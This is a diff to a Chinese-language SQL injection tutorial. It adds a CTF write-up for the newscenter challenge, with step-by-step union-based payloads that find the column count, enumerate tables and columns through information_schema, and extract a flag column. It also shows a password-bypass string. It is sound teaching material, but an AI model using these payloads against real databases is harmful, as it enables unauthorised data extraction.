@@ -125,6 +125,47 @@ else{
 ```txt
 password=ffifdyop
 ```
+
+#### 例题4
+>tips:非常适合新手的一道题，题目来自于攻防世界web进阶题newscenter
+
+#### 说明
+此题无代码，需要盲注。
+
+测试中发现报错不会有回显，但是也没有过滤任何常用的SQL语句，不是难题。
+
+#### 分析
+这里准备采用联合查询的方式获得flag，首先构造了1个payload
+```txt
+' and 0 union select 1#
+```
+在firefox下直接返回一个空白页，猜测可能的原因是联合查询的列数不匹配导致查询结果出错。
+
+一点点的增加查询的列数，发现列数为3时可以。
+```txt
+' and 0 union select 1,2,3#
+```
+![行数测试](image\column_test_3.png)
+接下来查询表名
+```txt
+' and 0 union select 1,2,table_name from information_schema.tables#
+```
+![查询表名](image\column_name.png)
+得到了表名称secret_table
+接下来查询列名
+```txt
+' and 0 union select 1,2,column_name from information_schema.columns where table_name='secret_table'#
+```
+得到了列名fl4g
+
+查询fl4g中的内容即可得到flag
+```txt
+' and 0 union select 1,2,fl4g from secret_table#
+```
+
+#### 拓展
+这里拓展一些关于select后面加数字的一些内容。
+
 #### SQL注入常用函数
 
 1.database()
